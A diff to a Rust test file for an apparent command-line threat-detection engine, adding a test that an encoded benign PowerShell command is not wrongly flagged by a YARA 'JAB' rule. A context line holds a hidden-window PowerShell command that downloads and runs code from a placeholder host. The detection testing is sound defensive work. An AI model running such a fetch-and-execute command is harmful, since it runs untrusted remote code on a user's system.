@@ -678,6 +678,20 @@ fn everyday_script_host_command_lines_stay_clean() {
 }
 
 #[test]
+fn encoded_commands_from_developer_tools_are_not_flagged() {
+    // Like YARA Forge's SUSP_PS1_JAB_Pattern: `JAB` is how a UTF-16 `$` starts in Base64.
+    let jab = r#"rule SUSP_PS1_JAB_Test { meta: score = 70 strings: $a = "JAB" condition: $a }"#;
+    let (rules, _, _) = yara::compile_package(&yara::tests::package(&[("rules.yar", jab)])).unwrap();
+    let mut engine = engine();
+    engine.yara = yara::Yara::from_package(rules);
+    let code: Vec<u8> = "$r = Get-Date; Write-Output $r".encode_utf16().flat_map(u16::to_le_bytes).collect();
+    let line = format!(r"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -NoLogo -EncodedCommand {}", STANDARD.encode(code));
+    assert!(!engine.yara.scan(line.as_bytes()).is_empty(), "the rule matches this text");
+    let r = command(&engine, POWERSHELL, &line);
+    assert!(r.score < SUSPICIOUS && !r.findings.iter().any(|f| f.id.starts_with("yara.")), "{} {:?}", r.score, r.findings);
+}
+
+#[test]
 fn a_command_marked_safe_is_allowed() {
     let mut engine = engine();
     let line = "powershell -w hidden -c \"iex (irm http://example.invalid)\"";
